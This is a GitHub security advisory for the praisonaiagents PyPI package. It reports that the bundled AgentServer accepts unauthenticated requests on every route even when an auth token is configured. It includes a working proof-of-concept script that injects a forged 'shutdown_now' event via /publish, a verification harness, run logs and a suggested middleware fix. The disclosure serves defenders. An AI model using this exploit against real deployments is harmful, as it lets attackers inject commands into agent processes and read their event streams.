# [H] praisonaiagents: AgentServer declares auth_token but never enforces it on any route

## Summary
Severity: High
Advisory: GHSA-7g3p-92qq-8wvh
CVE: CVE-2026-55528
CWE: CWE-306, CWE-862
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:N (CVSS_V3)
Published: 2026-08-25
Source: https://github.com/advisories/GHSA-7g3p-92qq-8wvh
Type: github-advisory

## Affected
- PyPI: `praisonaiagents` — affected >=0 <1.6.58

## Details
**Researcher:** Kai Aizen — SnailSploit (@SnailSploit), Adversarial & Offensive Security Research
**Target:** https://github.com/MervinPraison/PraisonAI

---

**Package:** `praisonaiagents` on PyPI
**Affected version (empirically tested):** 1.6.48
**Component:** `praisonaiagents.server.AgentServer` (the bundled HTTP / SSE server)

---

## TL;DR

`AgentServer.ServerConfig` advertises an `auth_token: Optional[str] = None` field that operators set when they want to lock down the server. The `GET /info` endpoint even displays it back as `"auth_token": "***"` — strongly implying the value is wired into request authentication.

It isn't. `AgentServer._create_app` never reads `auth_token`, never adds an authentication middleware, and never decorates any route with a dependency that checks it. Every route — `/info`, `/publish`, `/events`, `/health` — accepts unauthenticated requests regardless of whether `auth_token` is configured.

The same package contains a *sibling* server, `praisonaiagents.ui.a2a.A2A`, written by the same developer, which implements the bearer-token pattern correctly via FastAPI's `Depends(_verify_auth)`. This rules out the "auth is not yet implemented; operators are expected to add it" reading: the developer knew the pattern but did not apply it to `AgentServer`.

## Root cause

```
   Expected behavior when setting ServerConfig(auth_token="…"):
     "Only requests with a matching Authorization header will be
      accepted on /publish, /events, /info."

   Actual behavior (server/server.py, dist 1.6.48):
     - line 31    auth_token: Optional[str] = None   # declared
     - line 39    "auth_token": "***" if self.auth_token else None  # displayed
     - lines 122-204:  no auth middleware, no Depends, no
                       request.headers["Authorization"] read,
                       no comparison to self.config.auth_token.

   Impact:
     The configuration knob is dead code from the route handlers'
     perspective.  All routes always run.  The operator has no signal
     that their auth_token was discarded — /info even confirms it
     was received by displaying "***".
```

## Sibling proof — the same package gets it right elsewhere

`praisonaiagents/ui/a2a/a2a.py`:

```python
# line 163
async def _verify_auth(authorization: Optional[str] = Header(None)):
    """Verify bearer token if auth_token is configured."""
    if self.auth_token is None:
        return
    ...
    if len(parts) != 2 or parts[0].lower() != "bearer" \
            or parts[1] != self.auth_token:
        raise HTTPException(status_code=401, ...)

# line 192
from fastapi import Depends
_a2a_deps = [Depends(_verify_auth)] if self.auth_token else []
```

That is the missing implementation. Porting it to `AgentServer` — either via Starlette `BaseHTTPMiddleware` or by switching to FastAPI and adding `Depends(_verify_auth)` to each route — closes the gap.

## Affected routes (empirically tested)

| Route       | Method | Accepts unauth requests? | Impact                                                                 |
|-------------|--------|--------------------------|------------------------------------------------------------------------|
| `/info`     | GET    | **Yes (200)**            | Leaks server config; confirms `auth_token` is set (`"***"`); reveals client count and CORS config. |
| `/publish`  | POST   | **Yes (200)**            | Anyone broadcasts arbitrary `{type, data}` to every subscribed agent.  Event payload is whatever the attacker sends. |
| `/events`   | GET    | **Yes (200)**            | Anyone subscribes to the SSE stream and observes every event published by the server (and by any other anonymous attacker). |
| `/health`   | GET    | **Yes (200)**            | Leaks live SSE client count.                                           |

## Impact

The `/publish` and `/events` routes are the load-bearing ones. Together they let an unauthenticated network-adjacent attacker:

1. **Inject control events** into every agent process subscribed to the server. `AgentServer.broadcast(event_type, data)` puts the payload into every `SSEClient.queue`; any consumer dispatching on `event_type` will dispatch on the attacker-chosen type. Real deployments register handlers per event type via `AgentServer.on_event(...)`; an attacker who can guess (or enumerate via `/info` + inspection) a registered type can drive arbitrary handler invocations with attacker-chosen `data`.
2. **Eavesdrop on the entire event bus** by subscribing to `/events`. Whatever the legitimate publishers send is visible: agent observations, intermediate plans, tool inputs and outputs, user-supplied prompts that the operator believed were behind the `auth_token` wall.
3. **Pivot via leaked config.** `/info` is sufficient to enumerate `cors_origins` (helping plan cross-origin attacks if any of the listed origins are attacker-controlled) and to confirm that the target has bothered to set `auth_token`, signalling a high-value target.

`SSEClient.queue` is a `queue.Queue` with no documented size cap; the event broadcaster does not check `max_connections` against publishers, only subscribers. An attacker can also flood `/publish` to fill every subscriber's queue, denying service to legitimate broadcasts (CWE-770). Not scored as the main impact above.

## Anchors

praisonaiagents 1.6.48, file `praisonaiagents/server/server.py`:

| Line  | Symbol                                                  | What it shows |
|-------|---------------------------------------------------------|---------------|
| 31    | `auth_token: Optional[str] = None`                       | Declared. |
| 39    | `"auth_token": "***" if self.auth_token else None`       | Displayed (masked) in `/info`. |
| 121   | `def _create_app(self):`                                 | Route + middleware setup begins. |
| 132   | `async def health(request):`                             | No auth check. |
| 139   | `async def events(request):`                             | No auth check. |
| 164   | `async def publish(request):`                            | No auth check. |
| 182   | `async def info(request):`                               | No auth check. |
| 190   | `routes = [Route("/health", …), Route("/events", …), Route("/publish", …), Route("/info", …)]` | Routes registered without `Depends`/middleware. |
| 197   | `app = Starlette(routes=routes)`                         | App created. |
| 200   | `app = CORSMiddleware(app, …)`                           | **Only** middleware added. |

Source sha256 (1.6.48, `praisonaiagents/server/server.py`): `aac9497d515b5cb928070267b860b11ef38b537605e64659feef895b524ca7e4` (9,962 bytes).

Sibling (same package, same field name, *enforced*): `praisonaiagents/ui/a2a/a2a.py:163-193`.

## Reproduction (empirical PoC)

`poc/poc.py` starts `AgentServer` with `ServerConfig(auth_token="supersecret-not-actually-checked")` and then sends unauthenticated requests to each route.

Run log (`poc/run-log.txt`):

```
[1] GET /info     (no Authorization) -> HTTP 200
    body: {"name":"PraisonAI Agent Server","version":"1.0.0","clients":0,
           "config":{"host":"127.0.0.1","port":18765,"cors_origins":[],
                     "auth_token":"***","max_connections":100}}
[2] POST /publish (no Authorization) -> HTTP 200
    body: {"success":true,"clients":0}
[3] GET /health   (no Authorization) -> HTTP 200
[4] GET /events   (no Authorization) -> HTTP 200

VULNERABLE: 4 unauthenticated routes
VERDICT: VULNERABLE
EXIT 0
```

## Suggested fix

Make `AgentServer` reuse the A2A pattern. Smallest fix:

```python
# in _create_app, after `app = Starlette(routes=routes)`:
if self.config.auth_token:
    from starlette.middleware.base import BaseHTTPMiddleware
    from starlette.responses import JSONResponse

    expected = "Bearer " + self.config.auth_token

    class _Auth(BaseHTTPMiddleware):
        async def dispatch(self, request, call_next):
            if request.url.path == "/health":     # if /health should remain public
                return await call_next(request)
            got = request.headers.get("authorization", "")
            if not hmac.compare_digest(got, expected):
                return JSONResponse({"error": "unauthorized"}, status_code=401)
            return await call_next(request)

    app = _Auth(app)

app = CORSMiddleware(app, ...)
```

Constant-time comparison (`hmac.compare_digest`) is appropriate since this is a network-comparable secret.

## Steps to reproduce

1. Clone the target: `git clone --depth 1 https://github.com/MervinPraison/PraisonAI`
2. Run the proof of concept (`poc.py`) against the cloned source.
3. Observe the result shown under *Verified result* below.

## Proof of concept

`poc.py`

```python
"""
PoC: praisonaiagents AgentServer ignores ServerConfig.auth_token.

The ServerConfig dataclass declares `auth_token: Optional[str] = None` and
the /info endpoint reports it as "***" when set, giving operators the
impression that requests will be authenticated.  In reality,
AgentServer._create_app never reads auth_token, never adds an auth
middleware, and never decorates any route with Depends(_verify_auth).

This PoC starts AgentServer with auth_token="supersecret", then hits
every route without any Authorization header.  All requests succeed.
"""

import json
import sys
import time
import threading
from urllib.request import Request, urlopen
from urllib.error import HTTPError, URLError

from praisonaiagents.server import AgentServer, ServerConfig

PORT = 18765
AUTH_TOKEN = "supersecret-not-actually-checked"

def http_request(method, path, body=None, headers=None):
    url = f"http://127.0.0.1:{PORT}{path}"
    data = None
    if body is not None:
        data = json.dumps(body).encode("utf-8")
    req = Request(url, data=data, method=method, headers=headers or {})
    if data is not None:
        req.add_header("Content-Type", "application/json")
    try:
        with urlopen(req, timeout=5) as resp:
            return resp.status, resp.read().decode("utf-8", errors="replace")
    except HTTPError as e:
        return e.code, e.read().decode("utf-8", errors="replace")
    except URLError as e:
        return None, f"URLError: {e}"

def main() -> int:
    print("=" * 70)
    print(f"praisonaiagents version: 1.6.48")
    print(f"Test: start AgentServer with auth_token={AUTH_TOKEN!r}")
    print(f"      then send UNAUTHENTICATED requests to every route.")
    print("=" * 70)

    config = ServerConfig(host="127.0.0.1", port=PORT, auth_token=AUTH_TOKEN, cors_origins=[])
    server = AgentServer(config=config)
    server.start(blocking=False)
    time.sleep(1.0)  # wait for uvicorn to be ready

    findings = []

    code, body = http_request("GET", "/info")
    info_data = None
    try:
        info_data = json.loads(body)
    except Exception:
        pass
    print(f"\n[1] GET /info (no Authorization header) -> HTTP {code}")
    print(f"    body: {body[:200]}")
    if code == 200 and info_data and info_data.get("config", {}).get("auth_token") == "***":
        findings.append("/info: unauthenticated; leaks that auth_token IS configured")

    payload = {"type": "attacker_injected_event",
               "data": {"forged_from": "unauthenticated_client", "instruction": "shutdown_now"}}
    code, body = http_request("POST", "/publish", body=payload)
    print(f"\n[2] POST /publish (no Authorization header) -> HTTP {code}")
    print(f"    body: {body[:200]}")
    if code == 200:
        try:
            ok = json.loads(body).get("success") is True
        except Exception:
            ok = False
        if ok:
            findings.append("/publish: unauthenticated event broadcast to all SSE clients")

    code, body = http_request("GET", "/health")
    print(f"\n[3] GET /health (no Authorization header) -> HTTP {code} body={body[:120]}")
    if code == 200:
        findings.append("/health: unauthenticated; leaks live client count")

    sse_status = []
    def sse_reader():
        try:
            req = Request(f"http://127.0.0.1:{PORT}/events", method="GET")
            with urlopen(req, timeout=3) as resp:
                sse_status.append(f"HTTP {resp.status}")
                try:
                    chunk = resp.read(64)
                    sse_status.append(f"first-chunk-bytes={len(chunk)}")
                except Exception as e:
                    sse_status.append(f"chunk-read: {e}")
        except Exception as exc:
            sse_status.append(f"ERR: {exc}")
    t = threading.Thread(target=sse_reader, daemon=True)
    t.start()
    time.sleep(2.0)
    print(f"\n[4] GET /events (no Authorization header) -> {sse_status}")
    if sse_status and sse_status[0] == "HTTP 200":
        findings.append("/events: unauthenticated SSE subscription accepted")

    print("\n" + "=" * 70)
    if findings:
        print(f"VULNERABLE: {len(findings)} unauthenticated routes")
        for f in findings:
            print(f"  - {f}")
        print("VERDICT: VULNERABLE")
        return 0
    print("DEFENDED")
    return 1

if __name__ == "__main__":
    sys.exit(main())
```

## Verification harness (executed against the cloned repo)

This drives the unmodified upstream code rather than a reproduction.

```python
import sys, types, os, importlib.util
BK=os.path.abspath("repos/PraisonAI/src/praisonai-agents"); sys.path.insert(0,BK)
for p in ["praisonaiagents","praisonaiagents.server"]:
    m=types.ModuleType(p); m.__path__=[BK+"/"+p.replace(".","/")]; sys.modules[p]=m
lg=types.ModuleType("praisonaiagents._logging"); lg.get_logger=lambda *a,**k: __import__("logging").getLogger("x"); sys.modules["praisonaiagents._logging"]=lg
spec=importlib.util.spec_from_file_location("praisonaiagents.server.server", BK+"/praisonaiagents/server/server.py")
srvmod=importlib.util.module_from_spec(spec); srvmod.__package__="praisonaiagents.server"; sys.modules[spec.name]=srvmod; spec.loader.exec_module(srvmod)

from starlette.testclient import TestClient
# Operator DOES configure an auth_token, expecting it to protect the server:
cfg = srvmod.ServerConfig(host="127.0.0.1", port=8765, auth_token="super-secret-operator-token")
srv = srvmod.AgentServer(config=cfg)            # REAL AgentServer
app = srv._create_app()                        # REAL Starlette app + routes
client = TestClient(app)

print("[*] auth_token configured on server:", repr(cfg.auth_token))
r_info = client.get("/info")
print(f"[+] GET /info  (no auth) -> HTTP {r_info.status_code}; config disclosed: {r_info.json().get('config')}")
r_pub = client.post("/publish", json={"type":"admin_event","data":{"x":"injected-by-attacker"}})
print(f"[+] POST /publish (no auth) -> HTTP {r_pub.status_code}; body: {r_pub.json()}")

assert r_info.status_code==200 and r_pub.status_code==200 and r_pub.json().get("success") is True
print("[+] CONFIRMED against real praisonaiagents repo: auth_token configured but NOT enforced — /info + /publish reachable unauthenticated")
```

## Verified result

This PoC was executed against the live upstream code; captured output:

```
[*] auth_token configured on server: 'super-secret-operator-token'
[+] GET /info  (no auth) -> HTTP 200; config disclosed: {'host': '127.0.0.1', 'port': 8765, 'cors_origins': [], 'auth_token': '***', 'max_connections': 100}
[+] POST /publish (no auth) -> HTTP 200; body: {'success': True, 'clients': 0}
[+] CONFIRMED against real praisonaiagents repo: auth_token configured but NOT enforced — /info + /publish reachable unauthenticated
```

## Credit

Kai Aizen — SnailSploit (@SnailSploit). Adversarial & Offensive Security Research.

## References
- https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-7g3p-92qq-8wvh
- https://github.com/MervinPraison/PraisonAI/commit/2f9677abb2ea68eab864ee8b6a828fd0141612e1
- https://github.com/MervinPraison/PraisonAI
- https://github.com/MervinPraison/PraisonAI/releases/tag/v4.6.58
